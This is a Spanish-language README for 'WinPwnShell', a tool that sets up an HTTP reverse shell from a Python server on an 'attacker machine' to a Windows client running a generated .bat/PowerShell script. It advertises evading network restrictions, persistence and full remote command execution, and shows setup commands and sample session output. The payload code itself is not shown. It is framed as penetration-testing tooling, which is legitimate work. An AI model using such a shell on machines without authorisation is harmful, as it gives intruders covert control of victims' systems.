
# WinPwnShell

**WinPwnShell** es una herramienta que implementa una reverse shell utilizando HTTP para la comunicación remota entre un servidor Python y un cliente Windows que ejecuta un script PowerShell. Está diseñada para pruebas de penetración y administración remota en entornos controlados.

## Características

- Comunicación vía HTTP, lo que permite evadir algunas restricciones de red.
- Utiliza PowerShell en Windows para ejecutar comandos y devolver resultados al servidor Python.
- Soporta comandos remotos y envío de salidas en tiempo real.
- Mantiene la persistencia en la máquina cliente mientras el servidor esté activo.
- Fácil de configurar y usar, con una interfaz en la consola.

## Requerimientos

- Python 3.x en el servidor.
- PowerShell en el cliente (Windows).
- Conexión HTTP entre el servidor y el cliente.

## Instalación

1. Clona el repositorio:
   ```bash
   git clone https://github.com/tu-usuario/WinPwnShell.git
   cd WinPwnShell
   ```

2. Ejecuta el servidor en tu máquina atacante:
   ```bash
   python3 winpwnshell.py <url> <puerto>
   ```

   Ejemplo:
   ```bash
   python3 winpwnshell.py http://servidor.ejemplo.com 8080
   ```

3. En la máquina Windows, ejecuta el archivo `.bat` generado para iniciar la conexión y recibir comandos.

## Uso

### Comandos disponibles

WinPwnShell permite ejecutar todos los comandos disponibles en la máquina Windows. Esto incluye cualquier comando que la máquina cliente sea capaz de procesar a través de PowerShell, dándole al servidor control total sobre la ejecución remota.

- **exit**: Finaliza la conexión entre el servidor y el cliente, pero **no cierra** la sesión de PowerShell en la máquina Windows.

Además, la herramienta genera un archivo de log que registra todos los comandos enviados y las salidas recibidas, lo que permite hacer un seguimiento de las acciones realizadas durante la sesión.

### Ejemplo

1. Al ejecutar el servidor:
   ```bash
   python3 winpwnshell.py http://servidor.ejemplo.com 8080
   ```

   Recibirás un mensaje similar a:
   ```
   Archivo .bat creado exitosamente: winpwnshell.bat
   Esperando respuesta de la máquina Windows.
   Servidor corriendo en http://0.0.0.0:8080
   ```

2. Después de ejecutar el archivo `.bat` en la máquina Windows, el servidor mostrará:
   ```
   Salida del comando:
   Conexion establecida satisfactoriamente
   ```

3. Ahora puedes ejecutar comandos desde el servidor:
   ```bash
   shell$ whoami
   ```

   La respuesta en la consola será:
   ```
   PC-1/desktop
   ```

4. Para cerrar la conexión, escribe `exit`:
   ```bash
   shell$ exit
   ```

   El servidor responderá:
   ```
   Comando 'exit' enviado a la máquina Windows.
   Conexión terminada. Cerrando servidor...
   ```

## Licencia

Este proyecto está licenciado bajo los términos de la [Licencia MIT](LICENSE).

